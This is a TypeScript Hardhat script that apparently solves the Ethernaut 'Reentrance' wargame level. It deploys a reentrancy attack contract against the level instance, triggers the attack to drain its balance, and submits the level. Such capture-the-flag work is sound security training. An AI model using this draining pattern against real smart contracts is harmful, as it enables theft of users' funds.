import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Reentrance } from '../typechain-types/Reentrance'
import { ReentrancyAttack } from '../typechain-types/ReentrancyAttack'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0xe6BA07257a9321e755184FB2F995e0600E78c16D'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Reentrance', levelAddress, signer, {
    value: ethers.utils.parseEther('0.001'),
  })) as Reentrance
  const attackContract = (await loadOrDeployContract(
    'ReentrancyAttack',
    [targetContract.address],
    signer,
  )) as ReentrancyAttack

  const donateTx = await targetContract.donate(attackContract.address, { value: ethers.utils.parseEther('0.0005') })
  console.log('Donate tx id: ', donateTx.hash)
  await donateTx.wait()

  console.log('Target balance: ', await ethers.provider.getBalance(targetContract.address))
  console.log('Attack balance: ', await targetContract.balanceOf(attackContract.address))

  const attackTx = await attackContract.attack()
  console.log('Attack tx id: ', attackTx.hash)
  await attackTx.wait()

  console.log('Target balance: ', await ethers.provider.getBalance(targetContract.address))
  console.log('Attack balance: ', await targetContract.balanceOf(attackContract.address))

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
